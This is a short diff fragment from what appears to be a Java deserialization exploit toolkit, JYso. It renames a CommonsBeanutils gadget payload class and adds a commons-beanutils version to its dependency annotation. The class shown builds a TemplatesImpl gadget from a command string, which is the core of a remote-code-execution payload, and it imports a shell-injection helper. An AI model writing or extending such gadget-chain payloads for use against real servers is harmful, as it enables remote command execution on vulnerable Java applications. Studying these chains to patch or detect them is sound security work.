@@ -15,8 +15,8 @@ import static com.qi4l.JYso.gadgets.Config.Config.POOL;
 import static com.qi4l.JYso.gadgets.utils.InjShell.insertField;
 import static com.qi4l.JYso.gadgets.utils.Reflections.setFieldValue;
 
-@Dependencies({"commons-beanutils:commons-beanutils:1.8.3"})
-public class CommonsBeanutils2183NOCC implements ObjectPayload<Object> {
+@Dependencies({"commons-beanutils:commons-beanutils:1.8.3", "commons-beanutils:commons-beanutils:1.7X"})
+public class CommonsBeanutils2183 implements ObjectPayload<Object> {
     @Override
     public Object getObject(String command) throws Exception {
         final Object templates = Gadgets.createTemplatesImpl(command);
